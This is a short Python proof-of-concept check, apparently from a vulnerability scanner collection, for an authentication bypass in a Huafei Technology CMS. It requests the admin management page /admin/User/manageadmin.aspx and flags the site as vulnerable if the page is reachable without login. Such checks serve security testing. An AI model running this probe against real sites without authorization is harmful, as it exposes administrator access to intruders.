#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 华飞科技cms绕过JS GETSHELL
referer: http://www.wooyun.org/bugs/wooyun-2010-083888
author: Lucifer
description: /admin/User/manageadmin.aspx 禁用JS可以直接访问。
'''
import sys
import requests
import warnings
from termcolor import cprint

class huaficms_bypass_js_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/admin/User/manageadmin.aspx"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            
            if req.status_code == 200 and r"addadmin.aspx" in req.text:
                cprint("[+]存在华飞科技cms绕过JS GETSHELL漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = huaficms_bypass_js_BaseVerify(sys.argv[1])
    testVuln.run()